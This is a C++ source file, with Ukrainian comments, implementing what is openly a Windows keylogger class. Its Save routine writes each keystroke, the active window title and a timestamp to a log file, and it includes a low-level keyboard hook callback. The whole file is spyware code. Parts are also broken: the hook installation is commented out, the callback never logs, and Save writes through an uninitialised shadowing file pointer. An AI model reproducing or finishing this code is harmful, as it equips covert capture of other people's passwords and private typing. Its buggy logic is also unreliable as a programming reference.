#include <Windows.h>
#include <time.h>
#include <iostream>
#include <cstdio>
#include <fstream>
#include "KeyLog.h"

#pragma comment(lib,"user32.lib")

HHOOK KeyLog::_hook = NULL;
LPARAM lParam1 = 0;
KBDLLHOOKSTRUCT KeyLog::kbdStruct;
std::ofstream* KeyLog::OUTPUT_FILE;

KeyLog::KeyLog() {}

KeyLog::KeyLog(HHOOK thisHook, KBDLLHOOKSTRUCT thisKbdStruct, std::ofstream* thisOUTPUT_FILE) {
	_hook = thisHook;
	kbdStruct = thisKbdStruct;
	OUTPUT_FILE = thisOUTPUT_FILE;
}

//KeyLog::KeyLog(const KeyLog& keylog) {
//	_hook = keylog._hook;
//	OUTPUT_FILE = &keylog.OUTPUT_FILE;
//}

KeyLog::~KeyLog() {}

LRESULT __stdcall KeyLog::HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0)
	{
		if (wParam == WM_KEYDOWN)
		{
			//kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
			KeyLog::SetKbdStruct(*((KBDLLHOOKSTRUCT*)lParam));
			// save to file
			//Save(kbdStruct.vkCode);
		}
	}
	return CallNextHookEx(KeyLog::GetHook(), nCode, wParam, lParam);
}

void KeyLog::ReleaseHook() {
	UnhookWindowsHookEx(KeyLog::GetHook());
}

int KeyLog::Save(int key_stroke)
{
	std::ofstream* OUTPUT_FILE;
	char lastwindow[256];

	if ((key_stroke == 1) || (key_stroke == 2))
		return 0; // ігнорувати клацання мишкою

	HWND foreground = GetForegroundWindow();


	HKL layout{};
	GUITHREADINFO gti{ sizeof(GUITHREADINFO) };
	if (GetGUIThreadInfo(NULL, &gti)) // отримати розкладку клавіатури потоку переднього плану
		layout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));
	else
		layout = GetKeyboardLayout(NULL); // отримати розкладку клавіатури цього потоку (завжди є const)
	std::cout << std::endl << layout << std::endl;
	//auto list = GetKeyboardLayoutList(0, NULL);


	if (foreground)
	{
		char window_title[256];
		GetWindowText(foreground, window_title, 256);

		if (strcmp(window_title, lastwindow) != 0) {
			strcpy_s(lastwindow, window_title);

			// отримати час
			time_t t = time(NULL);
			struct tm* tm = localtime(&t);
			char s[64];
			strftime(s, sizeof(s), "%c", tm);

		
			*OUTPUT_FILE << "\n\n[Window: " << window_title << " - at " << s << "] ";

			KeyLog::SetOutputFile(OUTPUT_FILE);
		}
	}


	std::cout << key_stroke << '\n';

	if (key_stroke == VK_BACK)
		*OUTPUT_FILE << "[BACKSPACE]";
	else if (key_stroke == VK_RETURN)
		*OUTPUT_FILE << "\n";
	else if (key_stroke == VK_SPACE)
		*OUTPUT_FILE << " ";
	else if (key_stroke == VK_TAB)
		*OUTPUT_FILE << "[TAB]";
	else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
		*OUTPUT_FILE << "[SHIFT]";
	else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
		*OUTPUT_FILE << "[CONTROL]";
	else if (key_stroke == VK_ESCAPE)
		*OUTPUT_FILE << "[ESCAPE]";
	else if (key_stroke == VK_END)
		*OUTPUT_FILE << "[END]";
	else if (key_stroke == VK_HOME)
		*OUTPUT_FILE << "[HOME]";
	else if (key_stroke == VK_LEFT)
		*OUTPUT_FILE << "[LEFT]";
	else if (key_stroke == VK_UP)
		*OUTPUT_FILE << "[UP]";
	else if (key_stroke == VK_RIGHT)
		*OUTPUT_FILE << "[RIGHT]";
	else if (key_stroke == VK_DOWN)
		*OUTPUT_FILE << "[DOWN]";
	else if (key_stroke == 190 || key_stroke == 110)
		*OUTPUT_FILE << ".";
	else if (key_stroke == 189 || key_stroke == 109)
		*OUTPUT_FILE << "-";
	else if (key_stroke == 20)
		*OUTPUT_FILE << "[CAPSLOCK]";
	else {
		char key;
		// перевірка Caps Lock
		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		// перевірка клавіші shift
		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
			lowercase = !lowercase;
		}

		// відображати віртуальну клавішу відповідно до розкладки клавіатури
		//key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
		key = MapVirtualKeyExW(key_stroke, MAPVK_VK_TO_CHAR, layout);


		//tolower converts it to lowercase properly
		// tolower правильно перетворює його на lowercase
		if (!lowercase) key = tolower(key);
		*OUTPUT_FILE << char(key);
		KeyLog::SetOutputFile(OUTPUT_FILE);
	}
	// замість того, щоб щоразу відкривати та закривати обробники файлів, залишаєм файл відкритим і скидаєм.
	KeyLog::GetOutputFile().flush();
	return 0;
}

void KeyLog::SetHook() {

	// Встановити хук і налаштувати його на використання функції зворотного виклику вище
	// WH_KEYBOARD_LL означає, що буде встановлено низький рівень перехоплення клавіатури. Більше інформації про це на MSDN.
	// Останні 2 параметри дорівнюють NULL, 0, оскільки функція зворотного виклику знаходиться в тому ж потоці та вікні, що й
	// функція, яка встановлює та звільняє хук.
	//if (!(KeyLog::SetHHook(SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0))))
	/*{
		MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
	}*/
}

HHOOK KeyLog::GetHook() {
	return _hook;
}

KBDLLHOOKSTRUCT KeyLog::GetKbdStruct() {
	return kbdStruct;
}

std::ofstream &KeyLog::GetOutputFile() {
	return *OUTPUT_FILE;
}

void KeyLog::SetHHook(HHOOK thisHook) {
	_hook = thisHook;
}

void KeyLog::SetKbdStruct(KBDLLHOOKSTRUCT thisKbdStruct) {
	kbdStruct = thisKbdStruct;
}

void KeyLog::SetOutputFile(std::ofstream* thisOUTPUT_FILE) {
	OUTPUT_FILE = thisOUTPUT_FILE;
}

